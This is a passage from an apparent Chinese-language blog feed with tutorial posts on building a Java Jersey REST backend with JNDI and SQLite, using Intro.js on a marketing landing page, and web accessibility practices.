href="http://www.codedata.com.tw/database/mysql-tutorial-getting-started">http://www.codedata.com.tw/database/mysql-tutorial-getting-started</a> )</li></ul><p>JDK 多版本管理工具，方便在同樣的機器上使用多版本 Java</p><ul><li><a href="https://sdkman.io/">https://sdkman.io/</a></li><li><a href="https://scoop.sh/">https://scoop.sh/</a></li></ul><h3 id="相關-Framework-學習"><a href="#相關-Framework-學習" class="headerlink" title="相關 Framework 學習"></a>相關 Framework 學習</h3><ul><li>Jersey (<a href="https://jersey.java.net/documentation/latest/">https://jersey.java.net/documentation/latest/</a> )</li><li>Jersey (<a href="http://examples.javacodegeeks.com/category/enterprise-java/rest/jersey/">http://examples.javacodegeeks.com/category/enterprise-java/rest/jersey/</a> )</li></ul><h3 id="IDE-Integrated-Development-Environment-選擇"><a href="#IDE-Integrated-Development-Environment-選擇" class="headerlink" title="IDE (Integrated Development Environment) 選擇"></a>IDE (Integrated Development Environment) 選擇</h3><ul><li>Eclipse (<a href="http://www.vogella.com/tutorials/Eclipse/article.html">http://www.vogella.com/tutorials/Eclipse/article.html</a> )</li><li>NetBeans (<a href="https://netbeans.org/kb/docs/java/quickstart.html">https://netbeans.org/kb/docs/java/quickstart.html</a> )</li><li>Intellij idea (<a href="https://www.jetbrains.com/idea/">https://www.jetbrains.com/idea/</a> )</li></ul><p>這篇附上 Eclipse 的相關快捷鍵，另外建議自動完成須更改一下設定，讓鍵入每一字的時候都可以出現。設定位置在 Window → Preferences → Java → Editor → Content Assist，Auto activation triggers for Java 為 IDE 遇到何種字元會自動啟動提示，請改為 <code>.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ(,；</code>，就會遇到什麼字元都自動提示惹。</p><table><thead><tr><th>快捷鍵</th><th>功能</th></tr></thead><tbody><tr><td>Ctrl+Shift+T</td><td>Opening a class</td></tr><tr><td>Ctrl+Shift+R</td><td>Opening a Resourse</td></tr><tr><td>F3 or ctrl+mouse click</td><td>go into a class</td></tr><tr><td>Ctrl+O</td><td>Quick Outline</td></tr><tr><td>Ctrl+H</td><td>Search menu</td></tr><tr><td>Ctrl+J</td><td>Incremental Find</td></tr><tr><td>Ctrl+Shift+&#x2F;</td><td>全部收合</td></tr><tr><td>Ctrl+*</td><td>全部展開</td></tr><tr><td>Ctrl+Shift+F</td><td>自動排版</td></tr></tbody></table><h2 id="打通三個關節開發-API-後端服務"><a href="#打通三個關節開發-API-後端服務" class="headerlink" title="打通三個關節開發 API 後端服務"></a>打通三個關節開發 API 後端服務</h2><p>系統配置上 Java 也有三種，依照需求會選用不同版本，如下：</p><ul><li>SE(Standard Edition)</li><li>ME(MicroEdition)</li><li>EE(Enterprise Edition)</li></ul><p>介紹文連結（<a href="http://www.codedata.com.tw/book/java-basic/index.php?p=ch1-2">http://www.codedata.com.tw/book/java-basic/index.php?p=ch1-2</a> ）</p><p>開工前，請先下載 JDK (Java Development Kit)，從翻譯來看就是開發工具組，JDK 中就包含 JRE (Java Runtime Environment)，有 JRE Java 程式就可以執行了。記得設環境變數，讓電腦找到工具組!!! 不然就!!! 什麼事都不會發生 XD</p><p>因為要寫 Web 應用，所以選擇 Java EE，下面是 EE 肚子裡裝 der 東西 XDDD</p><p><img src="https://i0.wp.com/readlearncode.com/wp-content/uploads/2017/02/java-ee-7-apis.png?ssl=1"></p><h3 id="創建-Java-Web-Appication"><a href="#創建-Java-Web-Appication" class="headerlink" title="創建 Java Web Appication"></a>創建 Java Web Appication</h3><p>首先！建立 Dynamic Web Project 並選擇 Runtime Server</p><ul><li><a href="http://ftp.mirror.tw/pub/apache/tomcat/">Tomcat</a></li><li>Jetty Plug-in</li><li><a href="http://mkn939.blogspot.tw/2013/05/eclipsejboss-as-7-new-server.html">JBoss</a></li></ul><p>可勾選自動生成 Web.xml ，或是自己輸入。</p><ul><li><p>目標: 利用 Jersey 這個 Framework 實做功能並發佈到湯姆貓上， 未使用自動建構工具前，需自行下載 Library 並放進 WebContent&#x2F;Web-INF&#x2F;lib 資料夾裡，這是 War 檔中固定的架構勿更改。</p></li><li><p>實作: 新增相關 class，並按照範例寫作，可依照這篇提供的範例 (<a href="http://www.vogella.com/tutorials/REST/article.html">http://www.vogella.com/tutorials/REST/article.html</a> )，做到第六章即可。</p></li></ul><p>完成之後我們就一次打通了 Q1 及 Q2 了 ╰(￣︶￣)╯</p><p>前端網頁(網址) &lt;—Q1—&gt; RESTful Web Service &lt;—Q2—&gt; Web 伺服器</p><p>A1：利用 Jersey 寫出 RESTful Web Service<br>A2：JBoss 可利用 Export War 檔，將檔案發佈至 Server</p><h3 id="透過-Jersey-RESTful-Service-寫入資料庫"><a href="#透過-Jersey-RESTful-Service-寫入資料庫" class="headerlink" title="透過 Jersey RESTful Service 寫入資料庫"></a>透過 Jersey RESTful Service 寫入資料庫</h3><p>現在剩下最後一個 Q3 惹!!!!!!!!!!</p><p>Web 伺服器 &lt;—Q3—&gt; 實體資料庫</p><p>Q3：如何讓撰寫的 RESTful Web Service 存取實體資料庫？<br>A3：複習 Java 連接 MySQL 的練習，並整合進 RESTful Service 中。</p><p>按照以下範例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Path(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRestPractice</span> &#123;</span><br><span class="line">   實作的類別 test = <span class="keyword">new</span> 實作的類別();</span><br><span class="line"></span><br><span class="line">     <span class="meta">@GET</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">      test.我是之前實作的功能();</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;hello &gt;////&lt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>為了避免一些問題，可以參考廣為流傳的設計模式，像是 <a href="https://en.wikipedia.org/wiki/Singleton_pattern">Singleton Design</a>。</p><p>設計模式，提供了大家程式架構的參考，在<a href="http://www.vogella.com/tutorials/REST/article.html">這範例中</a>的 ArticleDao，就有用到 <a href="http://charlesbc.blogspot.tw/2009/04/design-pattern-singleton.html">Singleton</a> 的概念，就是單一個 Instance。</p><p>Singleton 模式可以保證一個類別只有一個 Instance。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">ArticleDao</span> &#123;</span><br><span class="line">    instance;</span><br><span class="line">    <span class="comment">//利用HashMap當資料來源</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Article&gt; contentProvider = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ArticleDao</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Article</span> <span class="variable">article</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Article</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;Learn REST&quot;</span>);</span><br><span class="line">    article.setContent(<span class="string">&quot;Read http://www.vogella.com/tutorials/REST/article.html&quot;</span>);</span><br><span class="line">    contentProvider.put(<span class="string">&quot;1&quot;</span>, article);</span><br><span class="line">    article = <span class="keyword">new</span> <span class="title class_">Article</span>(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;Do something&quot;</span>);</span><br><span class="line">    article.setContent(<span class="string">&quot;Read complete http://www.vogella.com&quot;</span>);</span><br><span class="line">    contentProvider.put(<span class="string">&quot;2&quot;</span>, article);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Article&gt; <span class="title function_">getModel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> contentProvider;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他地方則透過 <code>ArticleDao.instance.getModel().values()</code> 來叫用內部資料。底下簡單示範了怎麼從 sqlite 中撈出 thing 中的所有資料。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSqlite</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TestSqlite</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestSqlite</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TestSqlite</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TestSqlite <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">initialSqliteString</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource) ctx</span><br><span class="line">.lookup(<span class="string">&quot;java:comp/env/jdbc/sqlite&quot;</span>);</span><br><span class="line">conn = ds.getConnection();</span><br><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">statement.executeUpdate(<span class="string">&quot;create table thing(x integer)&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// Could well be already there</span></span><br><span class="line">&#125;</span><br><span class="line">statement.executeUpdate(<span class="string">&quot;insert into thing values(42)&quot;</span>);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(<span class="string">&quot;select * from thing&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line"></span><br><span class="line">LOGGER.info(<span class="string">&quot;id = &quot;</span> + rs.getInt(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">LOGGER.info(<span class="string">&quot;Exception = &quot;</span> + e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (conn != <span class="literal">null</span>)</span><br><span class="line">conn.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">LOGGER.info(<span class="string">&quot;Exception = &quot;</span> + e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="什麼是-JNDI"><a href="#什麼是-JNDI" class="headerlink" title="什麼是 JNDI"></a>什麼是 JNDI</h4><p>JNDI （Java Naming and Directory Interface ），看了一陣子原文介紹之後，真心覺得發明一堆奇怪的名詞的目的在於！！！讓人覺得自己很蠢，導致會覺得作者很猛 XDDD 然後留一個小難跨過的 Gap，來讓知識不普及 XDDD</p><p>譬如當我們想搞一個後端資料連結用的服務，那顯然需要把他配置到你的 Server 上，同時也會需要一個 JNDI name ，接著這個 JNDI Name 跟 interface 就都會被註冊到 JNDI Service。</p><p>當 Client 程式在執行時，要先去找 (lookup()) 到一個後端資料連結的 interface ，如果小幸運找到在 JNDI Service 裡面，這時候 JNDI Service 會回給你一個 remote 的 reference ，取得的這個 remote reference 是一個 Object ，有了這個 Object ，你就可以用它做你想做的事情，譬如去得到一個後端連結(getConnection)…</p><p>所以簡單來說，雖然是你做你的我做我的，不過出一張嘴的才是算數的，反正最後給我弄出這樣那樣的 OOO 讓我可以用就好，然後打雜小弟就可以開始努力實做出各種來提供，後人也就不用了解像是帳號密碼 IP 位置或是 Driver 去哪下載惹。</p><h4 id="資料物件名詞-取名主要用來辨識關係"><a href="#資料物件名詞-取名主要用來辨識關係" class="headerlink" title="資料物件名詞 (取名主要用來辨識關係)"></a>資料物件名詞 (取名主要用來辨識關係)</h4><ol><li>POJO (pure old java object)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>DAO (data access objects)<br>主要配合資料庫</li><li>PO (persistant object)<br>Hibernate example: 當 POJO 被實體化(instance) 有 set 值，接著進入 session 後。</li><li>DTO（data transfer object）<br>POJO 永久化成 PO，PO 組合成 DTO。</li><li>JavaBean<br>POJO 可序列化，有一個無參數的建構子，使用 getter 和 setter 方法來訪問屬性。</li><li>XML，JSON<br>都是 Web 常用的傳輸格式。</li></ol><p>現況：表中有 100 個欄位，則相對應的 PO 有 100 個屬性。<br>情境：界面上只需顯示 10 個欄位。<br>實作：Client 向服務端取值，服務端不需傳全部的 PO，此時將只有 10 個屬性及傳遞的參數組成 DTO 來傳遞結果。</p><p>Hibernate<br>操作物件就可以完成讀寫資料庫，是一個結合 JDBC 和物件的 Framework。</p><h4 id="標註"><a href="#標註" class="headerlink" title="@標註"></a>@標註</h4><p>主要就是對程式碼加些@標註，給人看也給機器讀。之前看過的 @Override 就是內建的一個標註，就是要進行 parent 函數覆寫的意思，@Deprecated 被標注的方法或類型已不再推薦使用。</p><p>用在其他 Annotation 上的 Annotation</p><ol><li><code>@Retention</code>: 確定標註的生命周期, 用一個 Enum 的 RetentionPolicy 參數設定</li><li><code>@Documented</code>: 文檔化</li><li><code>@Target</code>: 表示標註適用的範圍，也用 Enum 的 EnumType 的參數設定</li><li><code>@SessionScope</code></li><li><code>@Inject</code>: 針對資料的標註，@JsonProperty 改變 JSON 名稱</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Name</span> &#123;</span><br><span class="line">  <span class="meta">@JsonProperty(&quot;firstName&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> String _first_name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自訂標註則需要用到 <code>@interface</code>，不同於 interface，這次使用的是@interface</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Test &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照上面這樣撰寫後，其他地方就可以使用 @Test 做為自定標註了。</p><p>下一篇文章我們會介紹如何<a href="https://linyencheng.github.io/2018/04/06/java-jersey/?utm_source=link&utm_medium=article&utm_campaign=internal_link">如何使用 Jersey 這套框架來開發 RESTful Web services</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Backend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Landing Page X Intro.js</title>
      <link href="/2018/03/25/marketing-landingpage/"/>
      <url>/2018/03/25/marketing-landingpage/</url>
      
        <content type="html"><![CDATA[<p>網站到達頁（Landing Page）是行銷活動中至關重要的一環，目的是讓訪客進入特定頁面後達成預設目標。其中解說如下<a href="https://cola.workxplay.net/what-is-an-landing-page/">“Landing Page 的中文又稱為「網站到達頁」，講的是任何一個網頁，無論訪客是從哪個流量管道進來，只要他一進入特定頁面能達成某個你設定的目標”</a>。</p><p>透過精確的目標設定，Landing Page 可以協助企業實現行銷目標，提升轉換率。本文將介紹如何使用 Intro.js 來為網站到達頁增添互動式導覽，提升用戶體驗。</p><h2 id="什麼是網站到達頁（Landing-Page）？"><a href="#什麼是網站到達頁（Landing-Page）？" class="headerlink" title="什麼是網站到達頁（Landing Page）？"></a>什麼是網站到達頁（Landing Page）？</h2><p>網站到達頁，簡單來說，就是訪客進入某個網頁並完成特定行動的頁面。無論訪客是來自哪個流量管道，這個頁面都能幫助達成某些營銷目標，比如讓訪客註冊、購買產品或填寫問卷。為了達成這些目標，網站到達頁的設計和內容必須針對目標受眾進行精確的傳達。</p><h2 id="行銷名詞解釋"><a href="#行銷名詞解釋" class="headerlink" title="行銷名詞解釋"></a>行銷名詞解釋</h2><p>了解一些基本的行銷術語有助於我們更好地理解如何提升行銷效果。以下是一些常見的名詞解釋：</p><ol><li>Marketing Objective：營銷的目標</li><li>TA：目標受眾&#x2F;客戶</li><li>KOL：核心意見領袖 Key Opinion Leader</li><li>FMCG：快速消費品 Fast Moving Consumer Goods</li><li>Campaign ：廣告活動</li><li>ATL：Above The Line 線上</li><li>Tactical Marketing Plan：戰術營銷計畫</li><li>POSM：Point of Sale Materials</li></ol><h2 id="行銷流程示範：以雀巢咖啡為例"><a href="#行銷流程示範：以雀巢咖啡為例" class="headerlink" title="行銷流程示範：以雀巢咖啡為例"></a>行銷流程示範：以雀巢咖啡為例</h2><p>讓我們以雀巢咖啡為例，探討如何通過行銷流程來解決市場問題。首先，分析市場數據及消費者行為，然後進行競爭分析和新品開發。以下是部分關鍵步驟：</p><ul><li>市場趨勢：<ul><li>外帶隨手杯流行，沖泡包市場萎縮。</li><li>花式咖啡比例上升，白咖啡特別受到歡迎。</li><li>台灣人雖然杯數較少，但單杯量較大，手搖杯趨向大容量。</li></ul></li><li>關鍵問題：<ul><li>消費者是否不再喜歡傳統沖泡包？</li><li>結合市場趨勢及競爭對手分析，發現白咖啡有成長潛力，決定推出新產品。</li></ul></li><li>行銷活動：<ul><li>ATL 策略：通過電視廣告、KOL 宣傳和數位媒體曝光，將產品推廣給目標受眾。</li><li>線下活動：提供試用包、促銷折價券和賣場展示，吸引消費者。</li></ul></li></ul><p>要解決的關鍵問題，消費者是不是不再喜歡原本的產品？接著進行趨勢跟競爭品分析，配合目前產品趨勢，發現白咖啡有成長的趨勢，決定引進新產品．</p><p>新品項，從試喝沖泡跟隨手杯的比較開始，研發出 6 成以上都可以認同的沖泡包(產品評估&amp;開發)， 接著是設計包裝(配合 ml 大小問題)，接著開始進行 Campaign~</p><h3 id="ATL-策略"><a href="#ATL-策略" class="headerlink" title="ATL 策略"></a>ATL 策略</h3><ol><li>TVC 廣告訴求(強調咖啡特點)</li><li>找到符合產品形象的 KOL 進行宣傳</li><li>數位媒體的曝光</li><li>針對前三項的 TA 進行廣告的置入</li><li>電商合作，購買競爭者就直接送一包</li></ol><h3 id="線下活動"><a href="#線下活動" class="headerlink" title="線下活動"></a>線下活動</h3><ol><li>通路上的賣場 DEMO</li><li>相關線下廣告，產品陳列，價格策略</li><li>試用包，還包含折價券</li></ol><p>其實就是不斷找到受眾，透過各種方式去對受眾說話，不同的受眾會影響操作手法，重複著發現問題 -&gt; 找到客人 -&gt; 解決問題的過程，處理人的問題考驗著利益交換以及找資源的能力，多少錢就做多少事情，把有限預算的效果極大化~</p><h2 id="如何設計一個有效的到達頁面（Landing-Page）？"><a href="#如何設計一個有效的到達頁面（Landing-Page）？" class="headerlink" title="如何設計一個有效的到達頁面（Landing Page）？"></a>如何設計一個有效的到達頁面（Landing Page）？</h2><p>在設計 Landing Page 時，除了內容的精確傳達外，還需要增加互動性，這樣能提高用戶參與度並有效轉換。透過工具如 Intro.js，你可以輕鬆為網站加入引導性導覽，幫助使用者更好地了解產品或服務。</p><p>在前公司有依照自已的想法簡單做出一個關於 WebGIS 的到達頁其中透過實例及簡短的說明來告訴大家我們可以做到什麼，但由於當時還沒有專門的業務負責，還停在尋找客戶的階段，也未特別做一個聯繫窗口，可能會導致即使看到這個網頁卻無人可聯絡的情形，算是待改進的部分~</p><h2 id="Intro-js：提升網站到達頁的用戶體驗"><a href="#Intro-js：提升網站到達頁的用戶體驗" class="headerlink" title="Intro.js：提升網站到達頁的用戶體驗"></a>Intro.js：提升網站到達頁的用戶體驗</h2><p>來開箱網路上發現的好工具 Intro.js，當介面做得很爛?(誤)，需要導覽的時候，除了圖示說明或拍影片以外，就是使用類似這樣的引導工具了，能夠透過按照順序的彈跳說明來引導使用者，以下是官方的 Demo 連結。</p><p>Intro.js 是一個強大的 JavaScript 库，可以幫助你在網站中添加引導性導覽。無論是複雜的介面還是新手使用者，Intro.js 都能以簡單的步驟引導訪客完成操作，提高用戶體驗和互動性。</p><p><a href="https://introjs.com/example/hello-world/index.html">https://introjs.com/example/hello-world/index.html</a></p><h3 id="Intro-js-的安裝與使用"><a href="#Intro-js-的安裝與使用" class="headerlink" title="Intro.js 的安裝與使用"></a>Intro.js 的安裝與使用</h3><ol><li>安裝方法：最簡單的安裝方法是使用 CDN。你可以在網站中引入 Intro.js 的相關文件，並開始使用。</li><li>設置導覽步驟：在需要展示的元素中，加入適當的屬性（如 data-step 和 data-intro）來定義導覽步驟。</li><li>錯誤處理：為了避免錯誤，你可以在啟動導覽之前檢查 Intro.js 是否正確加載。這樣能防止因 CDN 加載失敗或其他問題而造成錯誤。</li><li>配置選項：有很多選項可以透過<a href="https://introjs.com/docs/intro/options/">配置參數設定</a>，例如更改按鈕標籤（”下一步”、”上一步”、”跳過” 等），以便根據網站風格調整顯示。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">introJs</span>()</span><br><span class="line">  .<span class="title function_">setOption</span>(<span class="string">&quot;nextLabel&quot;</span>, <span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">  .<span class="title function_">setOption</span>(<span class="string">&quot;prevLabel&quot;</span>, <span class="string">&quot;&lt;&lt;&quot;</span>)</span><br><span class="line">  .<span class="title function_">setOption</span>(<span class="string">&quot;skipLabel&quot;</span>, <span class="string">&quot;我要跳過!&quot;</span>)</span><br><span class="line">  .<span class="title function_">setOption</span>(<span class="string">&quot;doneLabel&quot;</span>, <span class="string">&quot;完成 &gt;.^&quot;</span>)</span><br><span class="line">  .<span class="title function_">start</span>()</span><br><span class="line">  .<span class="title function_">onexit</span>(callback);</span><br></pre></td></tr></table></figure><p>要先做完所有的設定才能跑 start() ，請記得，順序很重要，使用上完全無痛，只要啟動說明前記得先判斷 introJs 是否存在，這樣在 cdn 失敗或是想要拔掉的時候比較不會出現錯誤。</p><h2 id="結語：將-Intro-js-融入行銷策略"><a href="#結語：將-Intro-js-融入行銷策略" class="headerlink" title="結語：將 Intro.js 融入行銷策略"></a>結語：將 Intro.js 融入行銷策略</h2><p>通過有效的到達頁設計和利用像 Intro.js 這樣的工具，你可以大幅提升網站的用戶體驗和轉換率。記住，行銷的關鍵在於理解受眾需求並有效地與他們互動，這樣才能在競爭激烈的市場中脫穎而出。</p>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 數位行銷 </tag>
            
            <tag> Marketing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什麼是無障礙網頁?</title>
      <link href="/2018/02/04/html-accessibility/"/>
      <url>/2018/02/04/html-accessibility/</url>
      
        <content type="html"><![CDATA[<p>無障礙網頁跟一般網頁的差異，主要在協助視覺或是聽覺障礙者進行瀏覽。使用者可以透過使用滑鼠以外的工具來進行網站瀏覽，也可以使用螢幕閱讀器進行網頁讀取和使用。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/SBCRnUA3GcQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="JSX-Accessibility"><a href="#JSX-Accessibility" class="headerlink" title="JSX Accessibility"></a>JSX Accessibility</h2><p>最近才開始進入 react 16 版，發現說明文件也改版了！除了已經在官方有建議的 code-split 方法，竟然還有<a href="https://reactjs.org/docs/accessibility.html">a11y 無障礙的網頁設計建議</a>，我們還可以安裝 <code>eslint-plugin-jsx-a11y</code>，這樣 ESLint 就會提示我們 JSX 中有哪些沒有寫好的部分。</p><p>首先剛開始的 aria-label 或是進階一點的 aria-labelledby 都是為了增加螢幕閱讀器的辨識度，再來就是需要 focus 的 outline 效果，這樣在使用鍵盤操作的時候，能夠輕鬆的看出我們目前的所在位置，移動上主要是使用 <code>tab</code> 或是 <code>shift + tab</code> 來選擇 <code>&lt;input&gt; &lt;a&gt; &lt;button&gt;</code>，另外比較特別的是 <a href="https://developer.mozilla.org/zh-TW/docs/Web/HTML/Global_attributes/accesskey">accesskey</a> 的屬性可以方便我們快速的利用鍵盤跳到某個區塊，政府網頁通常會在上面設置<a href="https://www.handicap-free.nat.gov.tw/Questions/Detail/82?Category=33">導盲磚 :::</a> 來協助，藉由搭配 title 屬性文字方便語音合成器告知使用者，是在網頁中的哪一個區塊。</p><h2 id="設計部分與檢測工具"><a href="#設計部分與檢測工具" class="headerlink" title="設計部分與檢測工具"></a>設計部分與檢測工具</h2><p>其他就是比較偏設計，像是顏色的對比度，或是圖片要有替代文字，這些比較細節的設計可以使用 chrome 的外掛 <a href="https://chrome.google.com/webstore/detail/wave-evaluation-tool/jbbplnpkjmmeebjpijfedlgcdilocofh">wave-evaluation-tool</a> 來幫助，如果需要得到有跟沒有一樣?的標章認可，那就需要下載政府的<a href="https://www.handicap-free.nat.gov.tw/Download">檢測軟體</a>來檢測。</p>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leaflet 地圖實作教學</title>
      <link href="/2018/01/25/js-web-gis-infografic/"/>
      <url>/2018/01/25/js-web-gis-infografic/</url>
      
